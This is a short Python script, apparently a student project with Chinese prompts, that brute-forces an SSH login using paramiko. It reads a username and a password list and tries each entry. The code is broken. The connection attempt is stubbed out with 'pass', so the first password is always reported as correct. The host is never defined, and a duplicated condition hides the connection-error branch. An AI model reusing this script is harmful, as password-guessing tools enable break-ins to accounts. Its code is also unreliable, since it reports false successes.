import paramiko, sys, os, socket

global host, username, line,input_file



line = "\n-------------------------------------------------------\n"

try:
    username = input("[*] 輸入ssh使用者帳戶: ")
    inputPasswdFile = input("[*] 輸入欲猜測密碼清單位置: ")

    if os.path.exists(inputPasswdFile) == False:
        print("\n[*] 檔案路徑不存在！")
        sys.exit(4)
except KeyboardInterrupt:
    print("\n\n[*] 取消動作！")
    sys.exit(3)

def ssh_connect(passwd, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        pass
    except paramiko.AuthenticationException:
        #[*] Authentication FAiled ...
        code = 1
    except socket.error as se:
        #[*] Connection Failed ... Host Down
        code = 2

    ssh.close()  
    return code

input_file = open(inputPasswdFile)

print("")

for i in input_file.readlines():
    password = i.strip("\n")
    try:
        response = ssh_connect(password)

        if response == 0:
            print("%s[*] User: %s [*] Password: %s%s" % (line, username, password, line))
            sys.exit(0)
        elif response == 1:
            print("[*] User: %s [*] Password: %s >>> Login Incorrect !!! " % (username, password))
        elif response == 1:
            print("[*] Connection Could Not Be Established To Address: %s" % host)
            sys.exit(2)
    except Exception as e:
        print(e)
        pass

# 測試路徑 = /Users/marksun/Desktop/專題/dict/ip
